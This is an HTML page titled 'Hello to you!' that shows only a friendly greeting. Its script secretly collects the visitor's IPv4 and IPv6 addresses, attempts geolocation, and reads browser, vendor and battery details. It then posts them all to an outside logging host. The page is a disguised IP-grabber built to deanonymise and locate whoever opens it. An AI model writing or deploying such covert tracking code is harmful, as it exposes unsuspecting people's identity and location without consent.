<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hello to you!</title>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
</head>
<body>
    <h1>I just wanted to say hello! hope you're doing well. Take care.</h1>
    <script>
        (async() => {
            const ipv6Obj = await fetch('https://ipv6.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
            const ipv4Obj = await fetch('https://ipv4.seeip.org/jsonip').then((r) => r.json()).then(r => r).catch(e => console.error(e));
            let loc;
            try {
                loc = await navigator.geolocation.getCurrentPosition(pos => ({lat: pos.coords.latitude, lng: pos.coords.longitude}))
            } catch (err) {
                loc = {'error': err};
            }
            const battery = await navigator.getBattery();
            await fetch('https://ip-capture.onrender.com', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ipv4: ipv4Obj.ip, ipv6: ipv6Obj.ip, user_agent: navigator.userAgentData, product: navigator.product, vendor: navigator.vendor, battery, loc})
            })
        })()
    </script>
</body>
</html>
